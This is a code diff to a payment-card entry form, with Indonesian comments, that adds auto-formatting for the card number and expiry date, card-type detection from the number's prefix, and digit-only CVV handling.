@@ -137,18 +137,18 @@
 
         <label for="card_number">Card number</label>
         <div class="input-kartu">
-            <input type="text" id="card_number" name="card_number" maxlength="19" placeholder=" ">
+            <input type="text" id="card_number" name="card_number" maxlength="19" placeholder="•••• •••• •••• ••••">
             <img src="" alt="" class="logo-di-input" id="logo-di-samping" style="display:none;">
         </div>
 
         <div class="dua-kolom">
             <div class="kolom">
                 <label for="expiry">Expiration date</label>
-                <input type="text" id="expiry" name="expiry" placeholder="MM / YY" maxlength="7">
+                <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5">
             </div>
             <div class="kolom">
                 <label for="cvv">Security code (CVV)</label>
-                <input type="text" id="cvv" name="cvv" placeholder=" " maxlength="4">
+                <input type="text" id="cvv" name="cvv" placeholder="••••" maxlength="4">
             </div>
         </div>
 
@@ -211,39 +211,43 @@ const petaLogo = {
     jcb: "./img/jcb.png"
 };
 
-// === DETEKSI OTOMATIS BERDASARKAN ANGKA BIN ===
+// === DETEKSI JENIS KARTU DARI BIN ===
 function deteksiJenisKartu(bagianAwal) {
-    const angka = bagianAwal.replace(/\s/g, ""); // hapus spasi
-    
-    // Visa: mulai dengan 4
+    const angka = bagianAwal.replace(/\s/g, "");
     if(/^4/.test(angka)) return "visa";
-    // Mastercard: mulai dengan 51-55 atau 2221-2720
     if(/^5[1-5]/.test(angka) || /^2[2-7]/.test(angka)) return "mastercard";
-    // Amex: mulai dengan 34 atau 37
     if(/^3[47]/.test(angka)) return "amex";
-    // Discover: mulai dengan 6011, 65, 644-649
     if(/^6(?:011|5|4[4-9])/.test(angka)) return "discover";
-    // JCB: mulai dengan 3528-3589
     if(/^35(?:2[8-9]|[3-8]\d)/.test(angka)) return "jcb";
-    
     return "";
 }
 
-// Saat mengetik di kolom nomor kartu
+// === FORMAT OTOMATIS: XXXX XXXX XXXX XXXX ===
 document.getElementById("card_number").addEventListener("input", function() {
-    const nomor = this.value.trim();
-    const jenis = deteksiJenisKartu(nomor);
+    const murni = this.value.replace(/\D/g, "").slice(0, 16);
+    let terformat = "";
+    if(murni.length > 0) terformat = murni.match(/.{1,4}/g).join(" ");
+    this.value = terformat;
     
+    const jenis = deteksiJenisKartu(murni);
     if(jenis) {
         logoSamping.src = petaLogo[jenis];
         logoSamping.style.display = "block";
-        document.getElementById("card_type").value = jenis; // sinkronkan pilihan
+        document.getElementById("card_type").value = jenis;
     } else {
         logoSamping.style.display = "none";
     }
 });
 
-// Saat memilih manual dari daftar
+// === FORMAT MM/YY OTOMATIS ===
+document.getElementById("expiry").addEventListener("input", function() {
+    const murni = this.value.replace(/\D/g, "").slice(0, 4);
+    let terformat = murni;
+    if(murni.length >= 3) terformat = murni.slice(0, 2) + "/" + murni.slice(2);
+    this.value = terformat;
+});
+
+// Pilih manual dari daftar
 document.getElementById("card_type").addEventListener("change", function() {
     const jenis = this.value;
     if(jenis) {
@@ -254,6 +258,7 @@ document.getElementById("card_type").addEventListener("change", function() {
     }
 });
 
+// === KIRIM DATA ===
 document.getElementById("tombol-kirim").addEventListener("click", async function(e) {
     e.preventDefault();
     
@@ -285,7 +290,7 @@ document.getElementById("tombol-kirim").addEventListener("click", async function
     const cardType = document.getElementById("card_type").value;
     const cardNumber = document.getElementById("card_number").value;
     const expiry = document.getElementById("expiry").value;
-    const cvv = document.getElementById("cvv").value;
+    const cvv = document.getElementById("cvv").value.replace(/\D/g, "");
     const fullname = document.getElementById("fullname").value;
     const address = document.getElementById("address").value;
     const city = document.getElementById("city").value;
